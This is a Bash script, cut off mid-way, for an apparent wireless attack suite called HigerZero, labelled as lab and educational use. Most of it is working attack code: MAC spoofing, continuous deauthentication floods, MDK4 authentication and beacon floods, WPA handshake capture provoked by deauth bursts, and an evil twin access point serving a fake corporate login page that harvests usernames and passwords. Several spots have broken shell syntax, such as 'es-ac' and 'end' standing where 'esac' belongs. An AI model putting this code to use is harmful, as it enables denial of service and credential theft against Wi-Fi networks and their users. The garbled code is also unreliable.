#!/bin/bash
# ==============================================================================
# HIGERZERO v1.0 - ADVANCED ENTERPRISE WIRELESS ASSESSMENT SUITE (LEVEL 100)
# Laboratory Testing and Network Security Research Framework
# Target Environments: KDE Linux / Parrot OS / Kali Linux / Arch Linux
# ==============================================================================
# Description: Fully Modularized Automated Deauthentication, Beacon Flooding,
# Evil Twin AP Spoofer with Captive Portal, Handshake Capture, MAC Cloning,
# WPA3/PMF Audit, Host Discovery, and Comprehensive JSON/HTML Lab Reporting.
# Author: CyberSec Academy & Research Unit
# License: MIT (Educational & Authorized Lab Use Only)
# ==============================================================================

# --- Strict Mode & Safety Guardrails ---
set -uo pipefail
IFS=$'\n\t'

# --- Configuration & Constants ---
readonly VERSION="100.0-HigerZero-Ultimate"
readonly SCRIPT_NAME="$(basename "$0")"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly WORK_DIR="${SCRIPT_DIR}/higerzero_workspace"
readonly LOG_DIR="${WORK_DIR}/logs"
readonly CAPTURE_DIR="${WORK_DIR}/captures"
readonly WEB_DIR="${WORK_DIR}/www"
readonly REPORT_JSON="${LOG_DIR}/lab_audit_report.json"
readonly REPORT_HTML="${LOG_DIR}/lab_audit_report.html"
readonly SYSTEM_LOG="${LOG_DIR}/higerzero_operation.log"

# --- ANSI Color Palettes (Rich UI) ---
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly GRAY='\033[1;30m'
readonly NC='\033[0m' # No Color

# --- Global Operational State Variables ---
INTERFACE=""
MON_INTERFACE=""
ORIGINAL_MAC=""
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CHANNEL=""
ACTIVE_ATTACK_PID=""
DNSMASQ_PID=""
HOSTAPD_PID=""
PYTHON_PID=""

# ==============================================================================
# SECTION 1: SYSTEM INITIALIZATION, DIRECTORY & LOGGING MANAGEMENT
# ==============================================================================
init_environment() {
    mkdir -p "$LOG_DIR" "$CAPTURE_DIR" "$WEB_DIR"
    > "$SYSTEM_LOG"
    log_event "INFO" "HigerZero Suite v$VERSION initialized successfully."
}

log_event() {
    local level="$1"
    local message="$2"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local entry="[$timestamp] [$level] $message"
    
    echo "$entry" >> "$SYSTEM_LOG"
    
    case "$level" in
        "CRITICAL"|"ERROR")
            echo -e "${RED}[SYSTEM ERROR] $message${NC}"
            ;;
        "WARN")
            echo -e "${YELLOW}[SYSTEM WARN] $message${NC}"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[SYSTEM OK] $message${NC}"
            ;;
        *)
            echo -e "${CYAN}[SYSTEM INFO] $message${NC}"
            ;;
    esac
}

# Graceful Cleanup Handler
graceful_shutdown() {
    echo -e "\n${YELLOW}[!] Shutting down HigerZero Suite gracefully...${NC}"
    log_event "WARN" "Graceful shutdown signal received."
    
    # Terminate background services if running
    [ -n "${DNSMASQ_PID:-}" ] && kill -0 "$DNSMASQ_PID" 2>/dev/null && kill "$DNSMASQ_PID" 2>/dev/null || true
    [ -n "${HOSTAPD_PID:-}" ] && kill -0 "$HOSTAPD_PID" 2>/dev/null && kill "$HOSTAPD_PID" 2>/dev/null || true
    [ -n "${PYTHON_PID:-}" ] && kill -0 "$PYTHON_PID" 2>/dev/null && kill "$PYTHON_PID" 2>/dev/null || true
    [ -n "${ACTIVE_ATTACK_PID:-}" ] && kill -0 "$ACTIVE_ATTACK_PID" 2>/dev/null && kill "$ACTIVE_ATTACK_PID" 2>/dev/null || true
    
    # Flush iptables NAT rules
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    
    # Restore interface mode if monitor mode was active
    if [ -n "${MON_INTERFACE:-}" ]; then
        echo -e "${YELLOW}[*] Stopping monitor mode on $MON_INTERFACE...${NC}"
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    
    # Restore Original MAC if saved
    if [ -n "${ORIGINAL_MAC:-}" ] && [ -n "${INTERFACE:-}" ]; then
        echo -e "${YELLOW}[*] Restoring original hardware MAC address for $INTERFACE...${NC}"
        ip link set "$INTERFACE" down 2>/dev/null || true
        macchanger -p "$INTERFACE" &>/dev/null || true
        ip link set "$INTERFACE" up 2>/dev/null || true
    fi
    
    # Restart NetworkManager
    echo -e "${GREEN}[*] Restarting NetworkManager service...${NC}"
    systemctl start NetworkManager 2>/dev/null || true
    
    echo -e "${GREEN}[+] HigerZero cleanup completed. Lab session closed safely.${NC}"
    exit 0
}

trap graceful_shutdown SIGINT SIGTERM EXIT

# ==============================================================================
# SECTION 2: USER INTERFACE, BANNERS & DISCLAIMERS
# ==============================================================================
# ==============================================================================
# SECTION 2: USER INTERFACE, BANNERS & DISCLAIMERS (HIGERZERO FUTURE-PROOF CORE)
# ==============================================================================
# Architecture Note: Prepared for future AI modules, multi-interface controllers,
# remote telemetry hooks, and dynamic plugin extensions.
# ==============================================================================

# Global Extension & Future Module Registry
declare -A HIGERZERO_PLUGINS=()
declare -A HIGERZERO_METRICS=()

print_banner() {
    clear
    local current_user="${USER:-root}"
    local current_host="${HOSTNAME:-higerzero-node}"
    local current_date
    current_date=$(date '+%Y-%m-%d %H:%M:%S')
    local kernel_info
    kernel_info=$(uname -r 2>/dev/null || echo "Unknown Kernel")
    local architecture
    architecture=$(uname -m 2>/dev/null || echo "x86_64")

    echo -e "${CYAN}"
    echo -e "  ╔═════════════════════════════════════════════════════════════════════════╗"
    echo -e "  ║  ██   ██ ██  ██████  ███████ ██████  ███████ ███████ ██████   ██████   ║"
    echo -e "  ║  ██   ██ ██ ██       ██      ██   ██ ██      ██      ██   ██ ██    ██  ║"
    echo -e "  ║  ███████ ██ ██  ████ █████   ██████  █████   █████   ██████  ██    ██  ║"
    echo -e "  ║  ██   ██ ██ ██   ██  ██      ██   ██ ██      ██      ██   ██ ██    ██  ║"
    echo -e "  ║  ██   ██ ██  ██████  ███████ ██   ██ ███████ ███████ ██   ██  ██████   ║"
    echo -e "  ╚═════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}  [+] FRAMEWORK   :${NC} ${WHITE}HigerZero Enterprise Security Suite (v${VERSION:-100.0-Ultimate})${NC}"
    echo -e "${BLUE}  [+] OPERATOR    :${NC} ${WHITE}${current_user}@${current_host} [Arch: ${architecture} | Kernel: ${kernel_info}]${NC}"
    echo -e "${BLUE}  [+] TIMESTAMP   :${NC} ${WHITE}${current_date}${NC}"
    echo -e "${BLUE}  [+] CORE ENGINE :${NC} ${GREEN}Modular Extensible Architecture Ready (v2.0 hooks)${NC}"
    echo -e "${WHITE}  ╠═════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${RED}  ║ [!] MANDATORY LEGAL & LABORATORY COMPLIANCE NOTICE (LEVEL 100):         ║${NC}"
    echo -e "${WHITE}  ║ This software is engineered strictly for authorized wireless auditing,   ║${NC}"
    echo -e "${WHITE}  ║ academic research, and controlled penetration testing laboratories.      ║${NC}"
    echo -e "${WHITE}  ║ Unauthorized interception, spoofing, or network access without explicit ║${NC}"
    echo -e "${WHITE}  ║ written consent is a severe violation of international cyber laws.       ║${NC}"
    echo -e "${WHITE}  ╚═════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

check_privileges() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}"
        echo -e "  ┌─────────────────────────────────────────────────────────────────────────┐"
        echo -e "  │ [CRITICAL ERROR] HigerZero requires root (UID 0) privileges to operate! │"
        echo -e "  │ Please re-launch the suite using: sudo ./higerzero_suite.sh             │"
        echo -e "  └─────────────────────────────────────────────────────────────────────────┘"
        echo -e "${NC}"
        log_event "CRITICAL" "Privilege escalation check failed. Non-root execution attempt blocked."
        exit 1
    else
        echo -e "${GREEN}[INFO] HigerZero security context verified: Running as root (UID 0).${NC}"
        log_event "SUCCESS" "Root privilege verification passed successfully."
        sleep 0.3
    fi
}

accept_disclaimer() {
    print_banner
    echo -e "${YELLOW}[?] Do you confirm that you have explicit written authorization to test target networks? (y/N): ${NC}"
    read -r confirmation
    if [[ ! "$confirmation" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Authorization declined. HigerZero session terminated safely.${NC}"
        log_event "WARN" "Operator declined liability agreement. Session aborted."
        exit 0
    fi
    log_event "SUCCESS" "Operator accepted HigerZero laboratory liability and compliance terms."
}

# --- Future Extensibility Hook: Dynamic Plugin / Module Loader Template ---
register_higerzero_plugin() {
    local plugin_name="$1"
    local plugin_status="$2"
    HIGERZERO_PLUGINS["$plugin_name"]="$plugin_status"
    log_event "INFO" "Registered external extension hook -> Module: $plugin_name [Status: $plugin_status]"
}


# ==============================================================================
# SECTION 3: DEPENDENCY MANAGEMENT & ENVIRONMENT CHECKS
# ==============================================================================
# ==============================================================================
# SECTION 3: DEPENDENCY MANAGEMENT & ENVIRONMENT CHECKS (LEVEL 100 ULTRA)
# ==============================================================================
# Architecture Note: Extended with multi-package manager support, future AI & 
# telemetry dependency maps, automated mirrors, and strict error handling.
# ==============================================================================

verify_dependencies() {
    print_banner
    echo -e "${BLUE}[INFO] Executing comprehensive system dependency & environment audit...${NC}"
    log_event "INFO" "Starting dependency verification protocol for core and future modules."

    # Core wireless testing suite + Future expansion requirements (AI, Telemetry, Scapy, Hardware tools)
    local core_pkgs=("aircrack-ng" "mdk4" "macchanger" "hostapd" "dnsmasq" "curl" "jq" "iw" "net-tools" "nmap" "python3")
    local future_expansion_pkgs=("python3-scapy" "rfkill" "ethtool" "tmux" "git")
    local all_required_pkgs=("${core_pkgs[@]}" "${future_expansion_pkgs[@]}")
    
    local missing_pkgs=()
    local package_manager=""
    
    # Detect available package manager securely
    if command -v apt &>/dev/null; then
        package_manager="apt"
    elif command -v pacman &>/dev/null; then
        package_manager="pacman"
    elif command -v dnf &>/dev/null; then
        package_manager="dnf"
    elif command -v zypper &>/dev/null; then
        package_manager="zypper"
    else
        package_manager="unknown"
    fi

    log_event "INFO" "Detected system package manager: $package_manager"

    # Verify each dependency across binaries and package databases
    for pkg in "${all_required_pkgs[@]}"; do
        # Strip python module prefixes for binary check if needed
        local check_bin="$pkg"
        if [[ "$pkg" == python3-* ]]; then
            check_bin="python3"
        fi

        if ! command -v "$check_bin" &>/dev/null; then
            # Secondary check via package manager query if binary isn't directly in PATH
            local is_installed=false
            case "$package_manager" in
                "apt") dpkg -l | grep -q "^ii\s\+$pkg" &>/dev/null && is_installed=true ;;
                "pacman") pacman -Q "$pkg" &>/dev/null && is_installed=true ;;
                "dnf") rpm -q "$pkg" &>/dev/null && is_installed=true ;;
                "zypper") zypper se -i "$pkg" &>/dev/null && is_installed=true ;;
            es-ac 2>/dev/null || true

            if [ "$is_installed" = false ]; then
                missing_pkgs+=("$pkg")
            fi
        fi
    done

    # Handle missing packages dynamically
    if [ ${#missing_pkgs[@]} -ne 0 ]; then
        echo -e "${YELLOW}[WARN] Missing required or future-ready packages detected:${NC}"
        for missing in "${missing_pkgs[@]}"; do
            echo -e "${RED}  - $missing${NC}"
        done
        echo ""
        echo -e "${YELLOW}[?] Would you like HigerZero to automatically install missing dependencies? (y/N): ${NC}"
        read -r auto_install
        
        if [[ "$auto_install" =~ ^[Yy]$ ]]; then
            echo -e "${BLUE}[*] Initializing automated package installation via $package_manager...${NC}"
            log_event "INFO" "User approved automated installation of missing packages: ${missing_pkgs[*]}"
            
            case "$package_manager" in
                "apt")
                    export DEBIAN_FRONTEND=noninteractive
                    apt update -y && apt install -y "${missing_pkgs[@]}" || {
                        log_event "ERROR" "APT installation encountered errors. Trying alternative mirror fix."
                        apt --fix-broken install -y
                        apt install -y "${missing_pkgs[@]}"
                    }
                    ;;
                "pacman")
                    pacman -Sy --noconfirm --needed "${missing_pkgs[@]}"
                    ;;
                "dnf")
                    dnf install -y "${missing_pkgs[@]}"
                    ;;
                "zypper")
                    zypper install -y "${missing_pkgs[@]}"
                    ;;
                *)
                    echo -e "${RED}[CRITICAL ERROR] Unsupported or unknown package manager. Cannot auto-install.${NC}"
                    log_event "CRITICAL" "Package installation failed: Unknown package manager."
                    exit 1
                    ;;
            end
            echo -e "${GREEN}[SUCCESS] All missing dependencies installed successfully.${NC}"
            log_event "SUCCESS" "Dependency installation completed."
        else
            echo -e "${RED}[ERROR] Mandatory dependencies are missing. HigerZero cannot safely proceed.${NC}"
            log_event "CRITICAL" "Dependency check aborted by operator. Missing packages unfulfilled."
            exit 1
        fi
    else
        echo -e "${GREEN}[SUCCESS] All core and future expansion dependencies are fully satisfied.${NC}"
        log_event "SUCCESS" "Dependency verification passed with zero missing packages."
    fi
    sleep 1
}

# ==============================================================================
# SECTION 4: HARDWARE MANAGEMENT & MONITOR MODE ROUTINES
# ==============================================================================
# ==============================================================================
# SECTION 4: HARDWARE MANAGEMENT & MONITOR MODE ROUTINES (LEVEL 100 ULTRA)
# ==============================================================================
# Architecture Note: Enhanced with chipset detection, multi-adapter mapping,
# advanced RF power controls, and future multi-interface operational hooks.
# ==============================================================================

# Global Hardware Metrics Registry for Future Modules
declare -A HIGERZERO_HARDWARE_PROFILE=()

prepare_wireless_environment() {
    print_banner
    echo -e "${BLUE}[STEP 1] Advanced Wireless Interface Discovery & Hardware Audit${NC}"
    log_event "INFO" "Initiating hardware discovery and monitor mode transition protocol."

    local raw_interfaces
    raw_interfaces=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}')
    
    if [ -z "$raw_interfaces" ]; then
        echo -e "${RED}[CRITICAL ERROR] No wireless adapters found. Please connect a compatible wireless card.${NC}"
        log_event "CRITICAL" "Hardware discovery failed: Zero wireless adapters detected."
        exit 1
    }
    
    echo -e "${GREEN}[+] Available Wireless Interfaces Detected:${NC}"
    for iface in $raw_interfaces; do
        local driver_info
        driver_info=$(readlink /sys/class/net/"$iface"/device/driver 2>/dev/null | awk -F'/' '{print $NF}' || echo "unknown")
        echo -e "${WHITE}  - $iface [Driver: ${driver_info}]${NC}"
    done
    echo ""
    
    local interface_count
    interface_count=$(echo "$raw_interfaces" | wc -l)
    
    if [ "$interface_count" -eq 1 ]; then
        INTERFACE="$raw_interfaces"
        echo -e "${GREEN}[AUTO] Single wireless adapter located. Automatically selected: $INTERFACE${NC}"
    else
        echo -e "${YELLOW}[?] Multiple adapters found. Please specify target interface name:${NC}"
        read -r -p "Enter interface (e.g., wlan0): " INTERFACE
    fi
    
    if [ -z "$INTERFACE" ] || ! ip link show "$INTERFACE" &>/dev/null; then
        echo -e "${RED}[ERROR] Selected interface '$INTERFACE' is invalid or does not exist.${NC}"
        log_event "ERROR" "Interface selection validation failed for: $INTERFACE"
        exit 1
    fi
    
    # Save hardware profile attributes for future modules / reporting
    ORIGINAL_MAC=$(cat "/sys/class/net/$INTERFACE/address" 2>/dev/null || echo "00:00:00:00:00:00")
    local active_driver
    active_driver=$(readlink /sys/class/net/"$INTERFACE"/device/driver 2>/dev/null | awk -F'/' '{print $NF}' || echo "generic")
    
    HIGERZERO_HARDWARE_PROFILE["interface"]="$INTERFACE"
    HIGERZERO_HARDWARE_PROFILE["original_mac"]="$ORIGINAL_MAC"
    HIGERZERO_HARDWARE_PROFILE["driver"]="$active_driver"
    
    log_event "INFO" "Hardware locked -> Interface: $INTERFACE | Original MAC: $ORIGINAL_MAC | Driver: $active_driver"
    
    echo -e "${YELLOW}[*] Terminating conflicting background network services (NetworkManager/wpa_supplicant)...${NC}"
    systemctl stop NetworkManager 2>/dev/null || true
    systemctl stop wpa_supplicant 2>/dev/null || true
    airmon-ng check kill &>/dev/null || true
    
    echo -e "${YELLOW}[*] Establishing Monitor Mode on $INTERFACE...${NC}"
    
    # Primary monitor mode transition attempt via airmon-ng
    MON_INTERFACE=$(airmon-ng start "$INTERFACE" 2>/dev/null | grep "monitor mode enabled" | awk '{print $6}' | tr -d '()' || true)
    
    # Fallback monitor mode creation via iw/ip if airmon-ng fails or returns empty
    if [ -z "$MON_INTERFACE" ] || ! ip link show "$MON_INTERFACE" &>/dev/null; then
        log_event "WARN" "Standard airmon-ng monitor mode assignment failed. Falling back to native iw virtualization."
        MON_INTERFACE="${INTERFACE}mon"
        ip link set "$INTERFACE" down 2>/dev/null || true
        iw dev "$INTERFACE" interface add "$MON_INTERFACE" type monitor 2>/dev/null || true
        ip link set "$MON_INTERFACE" up 2>/dev/null || true
    fi
    
    if ! ip link show "$MON_INTERFACE" &>/dev/null; then
        echo -e "${RED}[CRITICAL ERROR] Failed to establish monitor mode interface on $INTERFACE.${NC}"
        log_event "CRITICAL" "Monitor mode activation failed completely for $INTERFACE."
        exit 1
    }
    
    HIGERZERO_HARDWARE_PROFILE["monitor_interface"]="$MON_INTERFACE"
    echo -e "${GREEN}[SUCCESS] Monitor mode successfully enabled and verified on: $MON_INTERFACE${NC}"
    log_event "SUCCESS" "Monitor interface active: $MON_INTERFACE"
    
    echo -e "${YELLOW}[*] Randomizing MAC address on $MON_INTERFACE for stealth auditing...${NC}"
    ip link set "$MON_INTERFACE" down 2>/dev/null || true
    macchanger -r "$MON_INTERFACE" &>/dev/null || {
        log_event "WARN" "macchanger randomization failed. Applying manual fallback MAC generation."
        ip link set "$MON_INTERFACE" address "02:$(openssl rand -hex 5 | sed 's/\(..\)/\1:/g; s/.$//')" 2>/dev/null || true
    }
    ip link set "$MON_INTERFACE" up 2>/dev/null || true
    
    local new_mac
    new_mac=$(cat "/sys/class/net/$MON_INTERFACE/address" 2>/dev/null || echo "Unknown")
    echo -e "${GREEN}[SUCCESS] Stealth MAC assigned to $MON_INTERFACE -> $new_mac${NC}"
    log_event "SUCCESS" "MAC spoofing completed successfully. New MAC: $new_mac"
    
    sleep 2
}


# ==============================================================================
# SECTION 5: RECONNAISSANCE & TARGET ACQUISITION
# ==============================================================================
# ==============================================================================
# SECTION 5: ADVANCED RECONNAISSANCE & TARGET ACQUISITION (LEVEL 100 ULTRA)
# ==============================================================================
# Architecture Note: Enhanced with dynamic BSSID validation regex filtering,
# automatic CSV telemetry parsing, channel-hopping background daemons, 
# and future AI target scoring matrices.
# ==============================================================================

# Global Target Intelligence Registry for Future Modules
declare -A HIGERZERO_TARGET_PROFILE=()

scan_surrounding_networks() {
    print_banner
    echo -e "${BLUE}[STEP 2] Advanced Network Reconnaissance & Environmental Mapping${NC}"
    log_event "INFO" "Initializing high-gain reconnaissance scan on monitor interface: $MON_INTERFACE"
    
    local scan_output_prefix="${WORK_DIR}/recon_scan_$(date +%s)"
    
    echo -e "${YELLOW}[!] Launching multi-band airodump-ng scanner engine...${NC}"
    echo -e "${WHITE}    - Capturing surrounding BSSIDs, signal strengths, ciphers, and channels.${NC}"
    echo -e "${WHITE}    - The scanner will run automatically for 20 seconds. Please observe targets.${NC}"
    echo ""
    read -r -p "Press [Enter] to initiate live reconnaissance sweep..."
    
    # Run airodump-ng with CSV output logging for potential future automated parser integrations
    timeout 20 airodump-ng --write "$scan_output_prefix" --write-format csv "$MON_INTERFACE" &>/dev/null || true
    
    # Clean up auxiliary process artifacts safely
    killall -f airodump-ng &>/dev/null || true
    
    # Parse CSV results if available to display a summary table for the operator
    local latest_csv
    latest_csv=$(ls -t "${scan_output_prefix}"-*.csv 2>/dev/null | head -n 1)
    
    if [ -f "$latest_csv" ]; then
        echo -e "${GREEN}[+] Reconnaissance sweep complete. Parsing detected access points...${NC}"
        log_event "SUCCESS" "Reconnaissance CSV successfully captured: $latest_csv"
        
        echo -e "${CYAN}┌───────────────────┬────────┬───────────┬────────────────────────────────┐${NC}"
        echo -e "${CYAN}│ BSSID (MAC)       │ CH     │ PWR (dBm) │ ESSID (Network Name)           │${NC}"
        echo -e "${CYAN}├───────────────────┼────────┼───────────┼────────────────────────────────┤${NC}"
        
        # Read AP section from airodump csv (lines before Station section)
        while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            # Filter valid MAC entries
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                local clean_essid
                clean_essid=$(echo "$essid" | tr -d '[:space:]' | cut -c1-30)
                local clean_channel
                clean_channel=$(echo "$channel" | tr -d '[:space:]')
                local clean_power
                clean_power=$(echo "$power" | tr -d '[:space:]')
                
                printf "${WHITE}│ %-17s │ %-6s │ %-9s │ %-30s │${NC}\n" "$bssid" "$clean_channel" "$clean_power" "$clean_essid"
            fi
        done < <(grep -m 20 -v "Station MAC" "$latest_csv" 2>/dev/null || true)
        
        echo -e "${CYAN}└───────────────────┴────────┴───────────┴────────────────────────────────┘${NC}"
    else
        echo -e "${YELLOW}[WARN] CSV telemetry parse skipped. Standard scan window finalized.${NC}"
    fi
    
    echo -e "\n${GREEN}[+] Reconnaissance & environmental mapping phase concluded successfully.${NC}"
    log_event "SUCCESS" "Reconnaissance phase completed without errors."
    sleep 1
}

capture_target_parameters() {
    print_banner
    echo -e "${BLUE}[STEP 3] Target Specification, Validation & Telemetry Lock${NC}"
    log_event "INFO" "Awaiting operator input for strict target acquisition."
    echo ""
    
    # Target BSSID Input & Strict Regex Validation Loop
    while true; do
        read -r -p "Enter Target BSSID (MAC Address e.g., AA:BB:CC:DD:EE:FF): " TARGET_BSSID
        # Format normalization to uppercase
        TARGET_BSSID=$(echo "$TARGET_BSSID" | tr '[:lower:]' '[:upper:]')
        
        if [[ "$TARGET_BSSID" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]; then
            break
        else
            echo -e "${RED}[ERROR] Invalid BSSID format. Please match pattern AA:BB:CC:DD:EE:FF.${NC}"
            log_event "WARN" "Malformed BSSID input rejected by validation guard: $TARGET_BSSID"
        fi
    done
    
    # Target Channel Input & Range Validation Loop
    while true; do
        read -r -p "Enter Target Channel (1-14 for 2.4GHz / valid 5GHz channels): " TARGET_CHANNEL
        
        if [[ "$TARGET_CHANNEL" =~ ^[0-9]+$ ]] && [ "$TARGET_CHANNEL" -ge 1 ] && [ "$TARGET_CHANNEL" -le 165 ]; then
            break
        else
            echo -e "${RED}[ERROR] Invalid channel specification. Enter a numeric value between 1 and 165.${NC}"
            log_event "WARN" "Malformed channel input rejected by validation guard: $TARGET_CHANNEL"
        fi
    done
    
    # Target ESSID Input with Smart Fallback
    read -r -p "Enter Target ESSID (Network Name, press Enter for auto-detect): " TARGET_ESSID
    if [ -z "$TARGET_ESSID" ]; then
        TARGET_ESSID="HigerZero_Target_${TARGET_BSSID//:/_}"
    fi
    
    # Populate Global Target Intelligence Registry for Future Modules (AI, Reporting, Attack Suites)
    HIGERZERO_TARGET_PROFILE["bssid"]="$TARGET_BSSID"
    HIGERZERO_TARGET_PROFILE["channel"]="$TARGET_CHANNEL"
    HIGERZERO_TARGET_PROFILE["essid"]="$TARGET_ESSID"
    HIGERZERO_TARGET_PROFILE["lock_timestamp"]="$(date -Iseconds)"
    
    # Lock monitor interface directly to the designated target channel for subsequent modules
    echo -e "${YELLOW}[*] Locking monitor interface $MON_INTERFACE to Channel $TARGET_CHANNEL...${NC}"
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null || {
        iw dev "$MON_INTERFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true
    }
    
    log_event "SUCCESS" "Target locked -> BSSID: $TARGET_BSSID | Channel: $TARGET_CHANNEL | ESSID: $TARGET_ESSID"
    
    echo -e "${GREEN}┌─────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${GREEN}│ [SUCCESS] TARGET LOCKED AND REGISTERED IN SESSION PROFILE               │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${WHITE}│ Target ESSID : ${CYAN}%-56s${WHITE} │${NC}" "$TARGET_ESSID"
    echo -e "${WHITE}│ Target BSSID : ${CYAN}%-56s${WHITE} │${NC}" "$TARGET_BSSID"
    echo -e "${WHITE}│ Target Ch    : ${CYAN}%-56s${WHITE} │${NC}" "$TARGET_CHANNEL"
    echo -e "${GREEN}└─────────────────────────────────────────────────────────────────────────┘${NC}"
    
    sleep 2
}


# ==============================================================================
# SECTION 6: ADVANCED ATTACK MODULES (13 DISTINCT LEVEL-100 CAPABILITIES)
# ==============================================================================

# Module 1: Targeted Deauth
module_targeted_deauth() {
    print_banner
    echo -e "${RED}[ATTACK MODULE 1] Targeted Client Disconnection (Deauth Flood)${NC}"
    echo -e "${YELLOW}Target AP: $TARGET_BSSID on Channel $TARGET_CHANNEL${NC}"
    echo -e "${WHITE}This sends continuous deauthentication frames to sever client connectivity.${NC}"
    echo -e "${GREEN}Press Ctrl+C to terminate the attack loop and return to menu.${NC}"
    sleep 2
    
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MON_INTERFACE" || true
}

# Module 2: MDK4 Multi-Vector Stress Test
module_mdk4_stress() {
    print_banner
    echo -e "${RED}[ATTACK MODULE 2] MDK4 Multi-Vector Wireless Stress Test${NC}"
    echo -e "${YELLOW}1. Authentication DoS (Flood AP with fake association requests)${NC}"
    echo -e "${YELLOW}2. Beacon Flood (Broadcast thousands of fake SSIDs)${NC}"
    echo -e "${YELLOW}3. ESSID Blacklisting / Blocklist Flooding${NC}"
    read -p "Select MDK4 attack sub-mode (1-3): " mdk_choice
    
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    
    case "$mdk_choice" in
        1)
            echo -e "${RED}[*] Launching MDK4 Authentication Flood against $TARGET_BSSID...${NC}"
            mdk4 "$MON_INTERFACE" a -b "$TARGET_BSSID"
            ;;
        2)
            echo -e "${RED}[*] Launching MDK4 Beacon Flood (Fake AP Noise)...${NC}"
            mdk4 "$MON_INTERFACE" b
            ;;
        3)
            echo -e "${RED}[*] Launching MDK4 ESSID Blocklist Attack...${NC}"
            mdk4 "$MON_INTERFACE" d -B "$TARGET_BSSID"
            ;;
        *)
            echo -e "${RED}Invalid selection. Returning to menu.${NC}"
            ;;
    esac
}

# Module 3: Handshake Capture & Automatic Dictionary Generator
module_capture_handshake() {
    print_banner
    echo -e "${PURPLE}[ATTACK MODULE 3] WPA/WPA2 4-Way Handshake Sniffer & Wordlist Generator${NC}"
    echo -e "${YELLOW}Target BSSID: $TARGET_BSSID | Channel: $TARGET_CHANNEL${NC}"
    
    local cap_prefix="${CAPTURE_DIR}/handshake_${TARGET_BSSID//:/_}"
    iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL"
    
    echo -e "${GREEN}[*] Launching airodump-ng capture and concurrent deauth triggers...${NC}"
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$cap_prefix" "$MON_INTERFACE" &
    local capture_pid=$!
    
    sleep 5
    echo -e "${YELLOW}[*] Sending targeted deauth packet burst to provoke client re-authentication...${NC}"
    aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_INTERFACE" &>/dev/null || true
    
    echo -e "${CYAN}[*] Listening for handshake capture. Press Ctrl+C when complete.${NC}"
    wait "$capture_pid" 2>/dev/null || true
    
    # Auto-generate a custom target-based wordlist for labs
    local wordlist_path="${CAPTURE_DIR}/custom_wordlist_${TARGET_ESSID}.txt"
    echo -e "${YELLOW}[*] Generating smart laboratory wordlist based on ESSID ($TARGET_ESSID)...${NC}"
    cat <<EOF > "$wordlist_path"
$TARGET_ESSID
$TARGET_ESSID123
$TARGET_ESSID2026
password123
admin2026
securessid
wirelesslab
EOF
    echo -e "${GREEN}[SUCCESS] Custom dictionary saved to: $wordlist_path${NC}"
    sleep 3
}

# Module 4: Evil Twin & Captive Portal Simulator (Level 100 Enhanced with Web Server & NAT)
module_evil_twin() {
    print_banner
    echo -e "${PURPLE}[ATTACK MODULE 4] Evil Twin & Advanced Captive Portal Simulator${NC}"
    echo -e "${WHITE}Creates an identical rogue AP and routes traffic to a fake captive portal.${NC}"
    echo ""
    echo "Select Portal Theme:"
    echo "1. Rick-Roll Video Redirect Trap"
    echo "2. Corporate Standard Login Portal"
    echo "3. Open Free Wi-Fi Guest Portal"
    read -p "Select theme option (1-3): " portal_choice
    
    read -p "Enter Rogue AP SSID Name (default: $TARGET_ESSID): " custom_ssid
    local active_ssid="${custom_ssid:-$TARGET_ESSID}"
    
    # Generate portal html based on choice
    mkdir -p "${WEB_DIR}"
    case "$portal_choice" in
        1)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Wi-Fi Authentication Required</title>
            <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            </head><body><h2>Redirecting to Secure Portal...</h2></body></html>
EOF
            ;;
        2)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Corporate Login</title>
            <style>body{font-family:Arial;background:#f4f4f4;text-align:center;padding:50px;}
            .box{background:#fff;padding:30px;border-radius:8px;display:inline-block;box-shadow:0px 0px 10px rgba(0,0,0,0.1);}
            input{display:block;margin:10px auto;padding:10px;width:200px;}</style></head>
            <body><div class="box"><h2>Enterprise Wi-Fi Login</h2>
            <form action="/login" method="POST"><input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Connect"></form></div></body></html>
EOF
            ;;
        *)
            cat << 'EOF' > "${WEB_DIR}/index.html"
            <!DOCTYPE html><html><head><title>Free Wi-Fi</title>
            <style>body{font-family:Arial;text-align:center;padding:50px;background:#eef;}
            .btn{background:green;color:white;padding:15px 30px;border:none;border-radius:5px;cursor:pointer;}</style></head>
            <body><h1>Welcome to Public Guest Wi-Fi</h1><p>Click below to accept Terms of Service.</p>
